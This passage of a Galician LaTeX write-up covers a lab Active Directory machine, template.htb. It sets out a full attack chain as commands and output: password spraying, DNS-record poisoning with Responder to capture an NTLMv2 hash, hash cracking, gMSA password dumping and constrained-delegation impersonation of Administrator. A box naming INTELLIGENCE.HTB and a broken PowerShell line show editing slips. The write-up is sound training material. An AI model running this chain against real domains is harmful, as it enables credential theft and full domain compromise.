+SMB   10.10.10.248 445 DC   [-] template.htb\Scott.Scott:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Stephanie.Young:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Teresa.Williamson:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Thomas.Hall:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Thomas.Valenzuela:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [+] template.htb\Tiffany.Molina:NewTemplateCorpUser9876
+SMB   10.10.10.248 445 DC   [-] template.htb\Travis.Evans:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\Veronica.Patel:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE
+SMB   10.10.10.248 445 DC   [-] template.htb\William.Lee:NewTemplateCorpUser9876 STATUS_LOGON_FAILURE\end{lstlisting}
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+        \centering
+Coa opción \textbf{--continue-on-success} aínda que atope coincidencias segue probando co resto de usuarios.
+\end{tcolorbox}
+
+
+Entón atopamos que o usuario \textbf{Tiffany.Molina} non modificou o contrasinal por defecto:
+        \begin{lstlisting}[language=Bash, caption=Usuario/s con contrasinal por defecto]
+SMB         10.10.10.248    445    DC               [+] template.htb\Tiffany.Molina:NewTemplateCorpUser9876\end{lstlisting}
+
+        \clearpage
+        \subsubsection{Flag user.txt}
+        \vspace{0.2cm}
+
+Agora con credenciais válidas podemos voltar a revisar \textbf{smb} e ver se existen recursos compartidos:
+        \begin{lstlisting}[language=Bash, caption=Recursos compartidos, linewidth=18.7cm]
+$ crackmapexec smb 10.10.10.248 -u Tiffany.Molina -p 'NewTemplateCorpUser9876' --shares
+SMB   10.10.10.248 445 DC   [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:template.htb) (signing:True) (SMBv1:False)
+SMB   10.10.10.248 445 DC   [+] template.htb\Tiffany.Molina:NewTemplateCorpUser9876 
+SMB   10.10.10.248 445 DC   [+] Enumerated shares
+SMB   10.10.10.248 445 DC   Share  Permissions  Remark
+SMB   10.10.10.248 445 DC   -----  -----------  ------
+SMB   10.10.10.248 445 DC   ADMIN$  Remote Admin
+SMB   10.10.10.248 445 DC   C$   Default share
+SMB   10.10.10.248 445 DC   IPC$   READ   Remote IPC
+SMB   10.10.10.248 445 DC   IT  READ   
+SMB   10.10.10.248 445 DC   NETLOGON  READ   Logon server share 
+SMB   10.10.10.248 445 DC   SYSVOL READ   Logon server share 
+SMB   10.10.10.248 445 DC   Users  READ   
+
+$ smbclient -U'template.htb/Tiffany.Molina%NewTemplateCorpUser9876'  -L //10.10.10.248
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	IT              Disk
+	NETLOGON        Disk      Logon server share
+	SYSVOL          Disk      Logon server share
+	Users           Disk
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+$ smbclient -U'template.htb/Tiffany.Molina%NewTemplateCorpUser9876'  //10.10.10.248/Users
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                  DR        0  Mon Apr 19 08:20:26 2021
+  ..                                 DR        0  Mon Apr 19 08:20:26 2021
+  Administrator                       D        0  Mon Apr 19 07:18:39 2021
+  All Users                       DHSrn        0  Sat Sep 15 14:21:46 2018
+  Default                           DHR        0  Mon Apr 19 09:17:40 2021
+  Default User                    DHSrn        0  Sat Sep 15 14:21:46 2018
+  desktop.ini                       AHS      174  Sat Sep 15 14:11:27 2018
+  Public                             DR        0  Mon Apr 19 07:18:39 2021
+  Ted.Graves                          D        0  Mon Apr 19 08:20:26 2021
+  Tiffany.Molina                      D        0  Mon Apr 19 07:51:46 2021
+
+		3770367 blocks of size 4096. 1265474 blocks available
+smb: \> cd Tiffany.Molina\Desktop\
+smb: \Tiffany.Molina\Desktop\> dir
+  .                                  DR        0  Mon Apr 19 07:51:46 2021
+  ..                                 DR        0  Mon Apr 19 07:51:46 2021
+  user.txt                           AR       34  Mon Jun  6 04:52:50 2022
+
+		3770367 blocks of size 4096. 1265474 blocks available
+smb: \Tiffany.Molina\Desktop\> get user.txt
+getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0,2 KiloBytes/sec) (average 0,2 KiloBytes/sec)
+smb: \Tiffany.Molina\Desktop\> exit\end{lstlisting}
+
+        \begin{lstlisting}[language=Bash, caption=Flag user.txt]
+$ cat user.txt\end{lstlisting}
+
+        \clearpage
+        \section{Escalada de privilexios}
+        \vspace{0.2cm}
+        \subsection{Movemento lateral}
+        Comprobamos o acceso ás contas doutros usuarios:
+        \begin{lstlisting}[language=Bash, caption=Outros usuarios existentes no sistema]
+$ smbclient -U'template.htb/Tiffany.Molina%NewTemplateCorpUser9876' //10.10.10.248/Users
+Try "help" to get a list of possible commands.
+smb: \> dir
+  .                                  DR        0  Mon Apr 19 03:20:26 2021
+  ..                                 DR        0  Mon Apr 19 03:20:26 2021
+  Administrator                       D        0  Mon Apr 19 02:18:39 2021
+  All Users                       DHSrn        0  Sat Sep 15 09:21:46 2018
+  Default                           DHR        0  Mon Apr 19 04:17:40 2021
+  Default User                    DHSrn        0  Sat Sep 15 09:21:46 2018
+  desktop.ini                       AHS      174  Sat Sep 15 09:11:27 2018
+  Public                             DR        0  Mon Apr 19 02:18:39 2021
+  Ted.Graves                          D        0  Mon Apr 19 03:20:26 2021
+  Tiffany.Molina                      D        0  Mon Apr 19 02:51:46 2021
+
+		3770367 blocks of size 4096. 1462539 blocks available
+smb: \> cd Administrator\
+smb: \Administrator\> dir
+NT_STATUS_ACCESS_DENIED listing \Administrator\*
+smb: \Administrator\> cd ..
+smb: \> cd Ted.Graves\
+smb: \Ted.Graves\> dir
+NT_STATUS_ACCESS_DENIED listing \Ted.Graves\*
+smb: \Ted.Graves\> exit\end{lstlisting}
+
+Investigamos nos recursos compartidos do usuario \textbf{Tiffany.Molina}:
+        \begin{lstlisting}[language=Bash, caption=Powershell]
+$ smbclient -U'template.htb/Tiffany.Molina%NewTemplateCorpUser9876'  //10.10.10.248/IT
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Mon Apr 19 07:50:55 2021
+  ..                                  D        0  Mon Apr 19 07:50:55 2021
+  downdetector.ps1                    A     1046  Mon Apr 19 07:50:55 2021
+
+		3770367 blocks of size 4096. 1265474 blocks available
+smb: \> get downdetector.ps1
+getting file downdetector.ps1 of size 1046 as downdetector.ps1 (2,3 KiloBytes/sec) (average 2,3 KiloBytes/sec)
+smb: \> exit\end{lstlisting}
+
+
+        \begin{lstlisting}[language=Bash, caption=downdetector.ps1: user Ted.Graves, linewidth=17.7cm]
+$ cat downdetector.ps1
+# Check web server status. Scheduled to run every 5min
+Import-Module ActiveDirectory
+foreach($record in Get-ChildItem "AD:DC=template.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=template,DC=htb" | 
+Where-Object Name -like "web*")  {
+try {
+$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
+if(.StatusCode -ne 200) {
+Send-MailMessage -From 'Ted Graves <Ted.Graves@template.htb>' -To 'Ted Graves <Ted.Graves@template.htb>' 
+-Subject "Host: $($record.Name) is down"
+}
+} catch {}
+}\end{lstlisting}             
+
+Vendo o contido de \textbf{downdetector.ps1} parece que dalgunha forma se facemos que un \textbf{rexistro dns} veña á nosa máquina enviaramos as credenciais do usuario \textbf{Ted Graves}. Agora, como facer iso do dns?
+        
+        \clearpage
+        \subsubsection{Xerar entrada DNS}                                                                                                               
+Imos xerar unha entrada dns para que apunte á nosa máquina \ipLocal mediante: dnstool + responder
+        \begin{tcolorbox}[enhanced,attach boxed title to top center={yshift=-3mm,yshifttext=-1mm},
+  colback=blue!5!white,colframe=blue!75!black,colbacktitle=green!80!black,
+  title=De Interese: dnstool,fonttitle=\bfseries,
+  boxed title style={size=small,colframe=red!50!black} ]
+        \centering
+\$ git clone https://github.com/dirkjanm/krbrelayx.git\end{tcolorbox}
+
+
+
+        \begin{lstlisting}[language=Bash, caption=Agregar entrada DNS]
+$ python dnstool.py -u 'template.htb\Tiffany.Molina' -p 'NewTemplateCorpUser9876' 
+-a add -t A -r weboli -d ¬\ipLocal¬ ¬\ipTarget¬ 
+[-] Connecting to host...
+[-] Binding to host
+[+] Bind OK
+[-] Adding new record
+[+] LDAP operation completed successfully\end{lstlisting}
+                                                 
+Entón agora a esperar co sniffer responder:
+        \begin{lstlisting}[language=Bash, caption=Sniffer responder]
+$ sudo responder -I tun0 -v
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR & MDNS Responder 3.1.1.0
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.12]
+    Responder IPv6             [dead:beef:2::100c]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-2S5JDT8VEO7]
+    Responder Domain Name      [3YAN.LOCAL]
+    Responder DCE-RPC Port     [49003]
+
+[+] Listening for events...
+
+[HTTP] Sending NTLM authentication request to ::ffff:10.10.10.248
+[HTTP] GET request from: ::ffff:10.10.10.248  URL: / 
+[HTTP] NTLMv2 Client   : ::ffff:10.10.10.248
+[HTTP] NTLMv2 Username : template\Ted.Graves
+[HTTP] NTLMv2 Hash     : Ted.Graves::template:4745f99d526a968f:8C3FB7124A598E1E864702B5BBB383DE:
+01010000000000000284F919EB79D80176795955FBE9F75500000000020008003300590041004E0001001E00570049004E00
+2D003200530035004A00440054003800560045004F003700040014003300590041004E002E004C004F00430041004C000300
+3400570049004E002D003200530035004A00440054003800560045004F0037002E003300590041004E002E004C004F004300
+41004C00050014003300590041004E002E004C004F00430041004C0008003000300000000000000000000000002000000CB2
+EC22769648DCD4A1DB26024C76D5E79BB1E85FEE97E0F4DD9AFF37F06B2E0A00100000000000000000000000000000000000
+09003A0048005400540050002F0077006500620032006F006C0069002E0069006E00740065006C006C006900670065006E00
+630065002E006800740062000000000000000000\end{lstlisting}
+
+\subsubsection{Credenciais usuario Ted.Graves}
+Conseguimos o hash do usuario \textbf{Ted.Graves}, do cal imos intentar descubrir o contrasinal mediante \textbf{John The Ripper}:
+        \begin{lstlisting}[language=Bash, caption=Credenciais Ted.Graves]
+$ cat hashes-responder.txt;john --wordlist=/usr/share/wordlists/rockyou.txt hashes-responder.txt 
+Ted.Graves::template:a9780eb466b95a59:10416D644E2D09301C630203DB065696:01010000000000003E19B11AE
+B79D8015D4A55333B8D8FFA00000000020008003300590041004E0001001E00570049004E002D003200530035004A0044005
+4003800560045004F003700040014003300590041004E002E004C004F00430041004C0003003400570049004E002D0032005
+30035004A00440054003800560045004F0037002E003300590041004E002E004C004F00430041004C0005001400330059004
+1004E002E004C004F00430041004C0008003000300000000000000000000000002000000CB2EC22769648DCD4A1DB26024C7
+6D5E79BB1E85FEE97E0F4DD9AFF37F06B2E0A001000000000000000000000000000000000000900380048005400540050002
+F007700650062006F006C0069002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:17 44.58% (ETA: 21:22:34) 0g/s 381934p/s 381934c/s 381934C/s kodima..kodikastimis
+Mr.Teddy         (Ted.Graves)     
+1g 0:00:00:28 DONE (2022-06-06 21:22) 0.03497g/s 378254p/s 378254c/s 378254C/s Mr.bobo..Mr.Smith5
+Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
+Session completed.\end{lstlisting} 
+ 
+        \vspace{0.2cm}
+
+Temos novas credenciais: \textbf{Ted.Graves:Mr.Teddy}
+Agora coas novas credenciais, imos comprobar:
+\begin{itemize}
+\item winrm - crackmapexec, evil-winrm
+\item smb - smbclient, smbmap, crackmapexec
+\end{itemize}
+
+\clearpage
+        \begin{lstlisting}[language=Bash, caption=Acceso ao sistema: winrm, linewidth=17.8cm]
+$ crackmapexec winrm 10.10.10.248 -u'Ted.Graves' -p'Mr.Teddy' 
+SMB         10.10.10.248    5985   DC               [*] Windows 10.0 Build 17763 (name:DC) (domain:template.htb)
+HTTP        10.10.10.248    5985   DC               [*] http://10.10.10.248:5985/wsman
+WINRM       10.10.10.248    5985   DC               [-] template.htb\Ted.Graves:Mr.Teddy
+               
+$ smbclient -U'template.htb/Ted.Graves%Mr.Teddy' -L  //10.10.10.248 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	IT              Disk      
+	NETLOGON        Disk      Logon server share 
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.248 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+
+$ smbmap -H 10.10.10.248 -u 'Ted.Graves' -p'Mr.Teddy'         
+[+] IP: 10.10.10.248:445	Name: dc.template.htb                               
+        Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	IT                                                	READ ONLY	
+	NETLOGON                                          	READ ONLY	Logon server share 
+	SYSVOL                                            	READ ONLY	Logon server share 
+	Users                                             	READ ONLY	
+                                                                                  
+$ sudo mount -t cifs //10.10.10.248/Users /mnt -o username=Ted.Graves,password=Mr.Teddy,domain=template.htb\end{lstlisting}
+
+Buscando en 10.10.10.248/Users e 10.10.10.248/IT non atopamos nada de interese.
+
+\subsection{Enumeración LDAP: ldapdomaindump + bloodhound}
+\subsubsection{GMSApassword}
+Imos estudar o directorio ldap mediante \textbf{ldapdomaindump} e \textbf{bloodhound} ou \textbf{sharphound}:
+        \begin{lstlisting}[language=Bash, caption=ldapdomaindump]
+$ ldapdomaindump -u'template.htb\Tiffany.Molina' -p'NewTemplateCorpUser9876' 10.10.10.248
+[*] Connecting to host...
+[*] Binding to host
+[+] Bind OK
+[*] Starting domain dump
+[+] Domain dump finished\end{lstlisting}             
+
+Buscamos información do usuario Ted.Graves:
+        \begin{lstlisting}[language=Bash, caption=Información sobre o usuario Ted.Graves]
+$ firefox $(grep -Hi ted.graves *html | cut -d ':' -f1 | sort -u)\end{lstlisting}
+
+        \begin{lstlisting}[language=Bash, caption=bloodhound, linewidth=17.8cm]
+$ sudo neo4j console
+$ bloodhound-python -c All -u 'Tiffany.Molina' -p 'NewTemplateCorpUser9876' -ns ¬\ipTarget¬ -d template.htb
+$ mkdir bloodhound; bloodhound >/dev/null 2>&1 &;disown
+\end{lstlisting}
+
+Buscamos en bloodhound por \emph{Analysis - Shortest Paths - Shortest Paths to Unconstrained Delegation Systems} e parece que obtemos un xeito de elevar privilexios, como podemos observar na seguinte imaxe: 
+        \begin{figure}[h]
+                \centering
+                \includegraphics[width=1.0\textwidth]{\bloodhound}
+                \caption{Elevación de privilexios}
+        \end{figure}
+
+
+        \begin{tcolorbox}[colback=green!5!white,colframe=green!75!black]
+Ted Graves - ReadGMSAPassword - svc\_int - AllowedToDelegate - DC.INTELLIGENCE.HTB
+SVC\_INT\@INTELLIGENCE.HTB is a Group Managed Service Account. The group ITSUPPORT\@INTELLIGENCE.HTB can retrieve the password for the GMSA SVC\_INT\@INTELLIGENCE.HTB.\end{tcolorbox}
+
+        \begin{lstlisting}[language=Bash, caption=Escalada de privilexios: gMSADumper]
+$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d template.htb
+Users or groups who can read password for svc_int$:
+ > DC$
+ > itsupport
+svc_int$:::ee6ba16bad56e4fd9cc2a4156710cd2d\end{lstlisting}
+
+Precisamos un correcto \textbf{spn}, logo empregamos \textbf{pywerview}:
+        \begin{lstlisting}[language=Bash, caption=Escalada de privilexios: pywerview]
+$ pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248
+dnshostname: svc_int.template.htb
+dnshostname: dc.template.htb
+
+$ pywerview get-netcomputer -u 'Ted.Graves' -p 'Mr.Teddy' -t 10.10.10.248 --full-data | grep -i allowedtodelegate
+msds-allowedtodelegateto:       WWW/dc.template.htb\end{lstlisting}
+
+
+
+\subsubsection{Flag root}
+\textbf{\color{red}{PROBLEMA TEMPO KERBEROS - ntpdate}}
+        \begin{lstlisting}[language=Bash, caption=ntp - kerberos]
+$ sudo timedatectl set-ntp false            
+                                                                                  
+$ sudo ntpdate 10.10.10.248 
+{"time":"2022-06-07T08:46:03.465482+0700","offset":-0.001070,"precision":0.053495,"host":"10.10.10.248",
+"ip":"10.10.10.248","stratum":1,"leap":"no-leap","adjusted":false}
+
+$ rm dates.txt;for i in $(timedatectl list-timezones)                                                                                                           
+do          
+  sudo timedatectl set-timezone $i; echo -n "$i " >> dates.txt
+  date >> dates.txt
+done  
+                                                                                 
+$ sudo timedatectl set-timezone Africa/Bissau\end{lstlisting}
+                                    
+        \begin{lstlisting}[language=Bash, caption=Acceso como administrador]
+$ getST.py -spn WWW/dc.template.htb -impersonate Administrator template.htb/svc_int 
+-hashes :ee6ba16bad56e4fd9cc2a4156710cd2d
+
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+[-] CCache file is not found. Skipping...
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*] 	Requesting S4U2self
+[*] 	Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+$ export 'KRB5CCNAME=Administrator.ccache'
+
+$ impacket-smbclient Administrator@dc.template.htb -k -no-pass 
+Impacket v0.10.1.dev1+20220606.123812.ac35841f - Copyright 2022 SecureAuth Corporation
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+IPC$
+IT
+NETLOGON
+SYSVOL
+Users
+# use Users
+# pwd
+\
+# ls
+drw-rw-rw-          0  Mon Apr 19 08:20:26 2021 .
+drw-rw-rw-          0  Mon Apr 19 08:20:26 2021 ..
+drw-rw-rw-          0  Mon Apr 19 07:18:39 2021 Administrator
+drw-rw-rw-          0  Mon Apr 19 10:16:30 2021 All Users
+drw-rw-rw-          0  Mon Apr 19 09:17:40 2021 Default
+drw-rw-rw-          0  Mon Apr 19 10:16:30 2021 Default User
+-rw-rw-rw-        174  Mon Apr 19 10:15:17 2021 desktop.ini
+drw-rw-rw-          0  Mon Apr 19 07:18:39 2021 Public
+drw-rw-rw-          0  Mon Apr 19 08:20:26 2021 Ted.Graves
+drw-rw-rw-          0  Mon Apr 19 07:51:46 2021 Tiffany.Molina
+# cd Administrator
+# cd Desktop
+# ls
+drw-rw-rw-          0  Mon Apr 19 07:51:57 2021 .
+drw-rw-rw-          0  Mon Apr 19 07:51:57 2021 ..
+-rw-rw-rw-        282  Mon Apr 19 07:40:10 2021 desktop.ini
+-rw-rw-rw-         34  Tue Jun  7 08:19:54 2022 root.txt
+# get root.txt
+# exit\end{lstlisting}
+                                                                                                                                                                       
+        \begin{lstlisting}[language=Bash, caption=Flag root.txt]
+$ cat root.txt  \end{lstlisting} 
+
+\clearpage
+\vspace*{-1.8cm}
+\begin{appendices}
+\addtocontents{toc}{\protect\setcounter{tocdepth}{2}}
+\makeatletter
+\addtocontents{toc}{%
+\begingroup
+%\let\protect\l@chapter\protect\l@section
+\let\protect\l@section\protect\l@subsection
+}
+
+\vspace*{-0.7cm}
+%\chapter{Pentesting AD-DC}
+\section{URLs de Interese}
+\vspace*{-0.2cm}
+        \centering
+        %\includegraphics[width=1.0\textwidth]{\urlsInterese}\par\vspace{1cm}
+        \input{include/URLs-de-Interese-Pentesting-AD-DC.tex}
+        %\input{include/URLs2-de-Interese-Pentesting-AD-DC.tex}
+\addtocontents{toc}{\endgroup}
+\end{appendices}
+
+\end{document}
